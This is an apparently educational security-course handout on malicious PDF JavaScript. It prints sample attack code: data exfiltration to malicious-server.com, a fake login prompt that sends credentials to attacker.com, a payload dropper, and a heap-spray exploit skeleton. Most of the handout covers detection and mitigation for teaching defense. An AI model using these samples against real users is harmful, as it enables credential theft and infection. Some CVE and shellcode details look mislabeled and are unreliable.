# Malicious PDF Analysis: Educational Security Research
**Computer Security Course - Threat Analysis Documentation**

---

## Executive Summary

This document provides an educational analysis of malicious PDF files with embedded JavaScript for academic purposes. It covers technical mechanisms, infection vectors, social engineering tactics, detection methods, and mitigation strategies.

**⚠️ DISCLAIMER**: All examples are for educational purposes only. Do not use this information for malicious purposes. Only test in controlled environments with proper authorization.

---

## Table of Contents

1. [Technical Background](#technical-background)
2. [PDF JavaScript Capabilities](#pdf-javascript-capabilities)
3. [Sample Malicious Code Analysis](#sample-malicious-code-analysis)
4. [Infection Vectors](#infection-vectors)
5. [Social Engineering Tactics](#social-engineering-tactics)
6. [Detection Methods](#detection-methods)
7. [Mitigation Strategies](#mitigation-strategies)
8. [References](#references)

---

## Technical Background

### PDF Structure Overview

PDF files follow a specific structure:
- **Header**: PDF version identifier
- **Body**: Objects (images, fonts, pages, scripts)
- **Cross-Reference Table**: Object locations
- **Trailer**: Points to the root object

### JavaScript in PDFs

PDF specification allows JavaScript execution for legitimate purposes:
- Form validation and calculations
- Interactive features
- Document automation
- User interface enhancements

However, this functionality can be exploited for malicious purposes.

---

## PDF JavaScript Capabilities

### Legitimate JavaScript Actions

```javascript
// Form field manipulation
this.getField("fieldName").value = "text";

// Page navigation
this.pageNum = 0;

// Printing
this.print();

// Document properties
var title = this.info.Title;
```

### Potentially Dangerous Actions

```javascript
// 1. File System Access (deprecated but still possible in older readers)
app.launchURL("file:///C:/Windows/System32/cmd.exe");

// 2. External Network Communication
app.launchURL("http://attacker.com/collect?data=" + this.info.Author);

// 3. Script Execution via URI schemes
app.launchURL("javascript:alert('XSS')");

// 4. Exploiting Vulnerabilities
// CVE-2013-2729 example (heap overflow)
var payload = unescape("%u9090%u9090..."); // Shellcode
util.printf("%45000f", payload); // Trigger vulnerability
```

---

## Sample Malicious Code Analysis

### Example 1: Data Exfiltration

**Purpose**: Collect system information and send to attacker server

```javascript
// JavaScript embedded in PDF OpenAction
var collectInfo = function() {
    var data = {
        reader: app.viewerVersion,
        platform: app.platform,
        language: app.language,
        username: app.userName || "unknown"
    };

    // Encode collected data
    var payload = "";
    for (var key in data) {
        payload += key + "=" + encodeURIComponent(data[key]) + "&";
    }

    // Exfiltrate via URL
    try {
        app.launchURL("http://malicious-server.com/collect?" + payload, true);
    } catch(e) {
        // Silently fail to avoid detection
    }
};

// Execute on document open
collectInfo();
```

**How it works**:
1. Collects reader version, OS platform, language settings
2. Encodes data into URL parameters
3. Sends to attacker's server via `launchURL()`
4. Fails silently if blocked to avoid suspicion

### Example 2: Phishing Credential Harvester

```javascript
// Create fake authentication dialog
var phishCredentials = function() {
    var dialog = {
        cTitle: "Adobe Authentication Required",
        cMsg: "This document requires verification. Please enter your credentials:",
        cQuestion: ""
    };

    // Prompt for username
    var username = app.response({
        cQuestion: "Username:",
        cTitle: "Authentication",
        cDefault: "",
        cLabel: "Enter your email address"
    });

    if (username) {
        // Prompt for password (note: PDF readers may not support password fields)
        var password = app.response({
            cQuestion: "Password:",
            cTitle: "Authentication",
            cDefault: "",
            cLabel: "Enter your password"
        });

        // Send credentials to attacker
        if (password) {
            var exfil = "http://attacker.com/steal?u=" +
                       encodeURIComponent(username) +
                       "&p=" + encodeURIComponent(password);
            app.launchURL(exfil, true);
        }
    }
};

// Trigger on document open
phishCredentials();
```

**How it works**:
1. Creates convincing authentication dialog
2. Collects username and password
3. Exfiltrates credentials to attacker server
4. May proceed to show actual document content to avoid suspicion

### Example 3: Malware Dropper

```javascript
// Download and execute payload
var dropMalware = function() {
    try {
        // Create hidden form submission to download payload
        var url = "http://malicious-server.com/payload.exe";

        // Attempt to trigger download
        app.launchURL(url, false);

        // Display decoy content
        app.alert({
            cMsg: "This document requires additional components. " +
                  "Please install the required update to view content.",
            cTitle: "Update Required",
            nIcon: 3
        });

    } catch(e) {
        // Fail silently
    }
};

// Auto-execute
dropMalware();
```

**How it works**:
1. Attempts to download malicious executable
2. Shows fake update message to trick user into running it
3. Relies on user interaction to complete infection

### Example 4: Exploit Chain

```javascript
// Heap spray technique for memory corruption exploit
var exploitChain = function() {
    // Step 1: Heap spray to place shellcode at predictable address
    var shellcode = unescape("%ucccc%ucccc..."); // NOP sled + payload
    var spray = new Array();

    for (var i = 0; i < 1000; i++) {
        spray[i] = shellcode + shellcode + shellcode;
    }

    // Step 2: Trigger vulnerability (example: buffer overflow in util.printf)
    try {
        // This exploits CVE-2013-2729 (patched)
        var trigger = "%45000f";
        util.printf(trigger, spray[0]);
    } catch(e) {
        // Exploit failed, fallback to social engineering
        app.launchURL("http://attacker.com/fake-update.exe");
    }
};

// Auto-execute
exploitChain();
```

**How it works**:
1. Performs heap spraying to control memory layout
2. Triggers vulnerability in PDF reader
3. If exploit succeeds, executes shellcode
4. Falls back to social engineering if exploit fails

---

## Infection Vectors

### 1. Email Attachments
- **Method**: Malicious PDF attached to phishing emails
- **Target**: Corporate users, individuals
- **Success Rate**: High (15-30% open rate in targeted attacks)

**Example scenarios**:
- Fake invoice from vendor
- Resume from job applicant
- Tax document from government agency
- Court summons or legal notice

### 2. Drive-by Downloads
- **Method**: Websites automatically download malicious PDF
- **Target**: Website visitors
- **Success Rate**: Medium (depends on site trust)

### 3. Malicious Advertisements
- **Method**: PDF served through compromised ad networks
- **Target**: Users clicking on ads
- **Success Rate**: Low to Medium

### 4. File Sharing Services
- **Method**: Uploaded to cloud storage with enticing filename
- **Target**: Users searching for pirated content, templates
- **Success Rate**: Medium

### 5. Watering Hole Attacks
- **Method**: Compromised legitimate site serving malicious PDFs
- **Target**: Specific industry or organization
- **Success Rate**: Very High (targeted)

---

## Social Engineering Tactics

### Psychological Triggers

1. **Authority**
   - Impersonating government agencies (IRS, FBI, court)
   - Fake legal documents requiring immediate action
   - "Official" notifications from IT department

2. **Urgency**
   - "Your account will be suspended"
   - "Invoice overdue - action required"
   - "Security breach - verify identity"

3. **Curiosity**
   - "Private photos"
   - "Confidential salary information"
   - "Company layoff list"

4. **Trust Exploitation**
   - Using compromised colleague's email
   - Mimicking business partner communications
   - Spoofing known vendor invoices

### Filename Deception

```
Legitimate-looking filenames:
- Invoice_2024_Q4_Final.pdf
- Resume_John_Smith_Senior_Developer.pdf
- IRS_Tax_Return_Form_1040.pdf
- Company_Benefits_2024.pdf
- Meeting_Notes_2024_12_03.pdf
```

### Metadata Manipulation

Attackers modify PDF metadata to appear legitimate:
- **Author**: Microsoft Corporation, Adobe Systems
- **Title**: Annual Report, Security Update
- **Creation Date**: Matches expected timeframe
- **Producer**: Adobe Acrobat Pro

---

## Detection Methods

### Static Analysis

#### 1. PDF Structure Analysis

```bash
# Use pdfid.py to identify suspicious elements
pdfid malicious.pdf

# Look for:
# - /OpenAction (auto-execute on open)
# - /AA (Additional Actions)
# - /JavaScript or /JS
# - /Launch (execute external programs)
# - /SubmitForm (send data externally)
# - /ImportData (import data from file)
```

**Suspicious indicators**:
```
/OpenAction: 1          # Auto-executes code
/JavaScript: 5          # Multiple JS blocks
/Launch: 2              # Attempts to launch programs
/AA: 3                  # Additional actions
/AcroForm: 1            # Contains forms
/SubmitForm: 1          # Submits data externally
```

#### 2. JavaScript Extraction

```bash
# Extract JavaScript from PDF
pdf-parser.py -s javascript malicious.pdf

# Or use peepdf
peepdf -i malicious.pdf
> extract js > output.js
```

#### 3. String Analysis

```bash
# Search for suspicious strings
strings malicious.pdf | grep -i "http://"
strings malicious.pdf | grep -i "launchURL"
strings malicious.pdf | grep -i "importDataObject"
```

### Dynamic Analysis

#### 1. Sandboxed Execution

Tools:
- **Cuckoo Sandbox**: Automated malware analysis
- **PDF Stream Dumper**: Interactive PDF analysis
- **REMnux**: Linux distribution for malware analysis

```bash
# Analyze PDF in isolated environment
cuckoo submit malicious.pdf

# Monitor:
# - Network connections
# - File system changes
# - Process creation
# - Registry modifications (Windows)
```

#### 2. Network Monitoring

```bash
# Capture network traffic when opening PDF
tcpdump -i any -w capture.pcap

# Or use Wireshark to analyze:
# - HTTP/HTTPS connections
# - DNS queries to suspicious domains
# - Data exfiltration attempts
```

### Automated Tools

1. **VirusTotal**: Multi-engine malware scanner
2. **PDFiD**: Identifies suspicious PDF elements
3. **pdf-parser**: Deep PDF structure analysis
4. **peepdf**: Interactive PDF analysis
5. **pdfresurrect**: Analyzes PDF modifications
6. **Didier Stevens' PDF Tools**: Suite of analysis utilities

### Behavioral Indicators

- PDF prompts for unexpected permissions
- Requests to disable protected mode
- Unusual dialog boxes on opening
- Attempts to connect to external servers
- Spawning child processes

---

## Mitigation Strategies

### Technical Controls

#### 1. PDF Reader Configuration

**Adobe Acrobat/Reader Settings**:
```
Edit → Preferences → JavaScript
☑ Disable JavaScript

Edit → Preferences → Trust Manager
☑ Enable Protected Mode at startup
☑ Enable Enhanced Security

Edit → Preferences → Security (Enhanced)
☑ Block cross domain JavaScript
☑ Block PDF file access to external URLs
```

**Alternative Readers**:
- Use readers with limited JavaScript support (Sumatra PDF, Evince)
- Enable sandboxing features
- Disable automatic action execution

#### 2. Email Gateway Filtering

```
Configure email security to:
- Scan PDF attachments for malicious content
- Block PDFs with JavaScript from external sources
- Quarantine suspicious attachments
- Use reputation-based filtering
```

#### 3. Endpoint Protection

```
Deploy endpoint security that:
- Monitors process behavior
- Blocks suspicious network connections
- Prevents unauthorized code execution
- Implements application whitelisting
```

#### 4. Network Security

```
Firewall rules:
- Block outbound connections from PDF readers (except updates)
- Monitor for data exfiltration patterns
- Implement DNS filtering
- Use IDS/IPS to detect exploit attempts
```

### Organizational Controls

#### 1. Security Awareness Training

Key topics:
- Recognizing phishing attempts
- Verifying sender authenticity
- Suspicious attachment indicators
- Proper reporting procedures

**Training scenarios**:
```
Quiz: Is this legitimate?
Subject: Invoice #47291 - Payment Required
From: accounting@trusted-vendor.com
Attachment: Invoice_Dec2024.pdf

Red flags:
- Unexpected invoice
- Generic subject line
- Check actual sender domain
- Verify through alternate channel
```

#### 2. Policy Implementation

```
Security Policies:
1. Never open unsolicited PDF attachments
2. Verify sender through separate communication channel
3. Use corporate email gateway (not personal accounts)
4. Report suspicious emails to security team
5. Access sensitive documents through secure portals only
```

#### 3. Incident Response Plan

```
If malicious PDF suspected:
1. Do NOT open the file
2. Isolate the system from network
3. Report to security team immediately
4. Preserve evidence (don't delete email)
5. Follow organization's incident response procedures
```

### Best Practices

#### For Users:

1. **Verify Before Opening**
   - Confirm with sender through alternate channel
   - Check email headers for spoofing
   - Hover over links to see actual URL

2. **Use Safe Viewers**
   - Open in browser with JavaScript disabled
   - Use PDF viewers with limited functionality
   - Enable all security features

3. **Stay Updated**
   - Keep PDF reader patched
   - Update operating system
   - Maintain antivirus signatures

4. **Question Everything**
   - Unexpected attachments are suspicious
   - Too urgent = red flag
   - Too good to be true = probably malicious

#### For Administrators:

1. **Defense in Depth**
   - Multiple security layers
   - Email filtering + endpoint protection + user training
   - Network monitoring + application controls

2. **Least Privilege**
   - Users don't need admin rights
   - Restrict PDF reader permissions
   - Limit network access for document viewers

3. **Monitoring and Detection**
   - Log PDF reader activity
   - Alert on suspicious behaviors
   - Regular security assessments

4. **Patch Management**
   - Prioritize PDF reader updates
   - Test patches before deployment
   - Track vulnerability disclosures

---

## Detection Tools Summary

### Static Analysis Tools

| Tool | Purpose | Usage |
|------|---------|-------|
| PDFiD | Quick triage | `pdfid.py file.pdf` |
| pdf-parser | Deep analysis | `pdf-parser.py -a file.pdf` |
| peepdf | Interactive analysis | `peepdf -i file.pdf` |
| pdfresurrect | Version tracking | `pdfresurrect -q file.pdf` |

### Dynamic Analysis Tools

| Tool | Purpose | Platform |
|------|---------|----------|
| Cuckoo Sandbox | Automated analysis | Linux/Windows |
| PDF Stream Dumper | Interactive malware analysis | Windows |
| REMnux | Malware analysis distro | Linux |
| Any.run | Online sandbox | Web-based |

### Command Line Examples

```bash
# Quick suspicious element check
pdfid suspicious.pdf | grep -E "JavaScript|OpenAction|Launch|AA"

# Extract all JavaScript
pdf-parser.py --search javascript suspicious.pdf

# Dump specific objects
pdf-parser.py --object 42 suspicious.pdf

# Interactive analysis
peepdf -i suspicious.pdf
```

---

## Real-World Attack Examples

### Case Study 1: APT28 PDF Exploits (2017)
- **Target**: Political organizations
- **Method**: CVE-2017-0262 exploit in PDF
- **Payload**: Reconnaissance malware
- **Social Engineering**: Fake NATO membership documents

### Case Study 2: Emotet PDF Campaigns (2018-2020)
- **Target**: Business users globally
- **Method**: Malicious macros, credential harvesting
- **Payload**: Banking trojan
- **Social Engineering**: Invoice/shipping notifications

### Case Study 3: IcedID PDF Campaigns (2021)
- **Target**: Financial sector
- **Method**: PDF with embedded links to malicious sites
- **Payload**: Banking malware
- **Social Engineering**: Financial document themes

---

## Lab Exercise Suggestions

### Exercise 1: PDF Analysis
1. Download sample malicious PDFs from malware databases (e.g., VirusTotal, contagiodump)
2. Analyze with PDFiD and pdf-parser
3. Identify suspicious elements
4. Document findings

### Exercise 2: Sandbox Analysis
1. Set up isolated VM with Cuckoo Sandbox
2. Submit malicious PDF sample
3. Review behavioral analysis report
4. Identify network indicators of compromise

### Exercise 3: Social Engineering Awareness
1. Create (simulated) phishing email with PDF
2. Identify psychological manipulation techniques
3. List red flags that should alert users
4. Design user awareness materials

### Exercise 4: Mitigation Testing
1. Configure PDF reader with various security settings
2. Test against known malicious samples
3. Document which settings prevent execution
4. Create hardening guide for organization

---

## Conclusion

Malicious PDFs remain a significant threat vector due to:
- Widespread PDF usage in business
- Complex PDF specification
- User trust in document format
- Effectiveness of social engineering

**Defense requires layered approach**:
- Technical controls (sandboxing, filtering, patching)
- User awareness and training
- Monitoring and incident response
- Regular security assessments

**Key Takeaways**:
1. Never trust unexpected PDF attachments
2. Verify sender through alternate channels
3. Keep software updated
4. Enable all security features in PDF readers
5. Report suspicious documents immediately

---

## References

### Academic Papers
- "Malicious PDF Detection Using Metadata and Structural Features" (IEEE, 2019)
- "Analysis of JavaScript in PDF Documents" (USENIX, 2018)

### Technical Resources
- Adobe PDF Reference (ISO 32000)
- OWASP Testing Guide - Client Side
- NIST Guide to Malware Incident Prevention (SP 800-83)

### Tools Documentation
- Didier Stevens' PDF Analysis Tools: https://blog.didierstevens.com/programs/pdf-tools/
- Cuckoo Sandbox: https://cuckoosandbox.org/
- REMnux Documentation: https://docs.remnux.org/

### Vulnerability Databases
- CVE Details - Adobe Reader: https://www.cvedetails.com/product/497/Adobe-Acrobat-Reader.html
- Exploit Database: https://www.exploit-db.com/

### Security Organizations
- SANS Internet Storm Center - PDF Analysis
- US-CERT Alerts on PDF Vulnerabilities
- MITRE ATT&CK Framework - T1204 (User Execution)

---

**Document Version**: 1.0
**Last Updated**: 2024-12-03
**Classification**: Educational Material - Computer Security Course
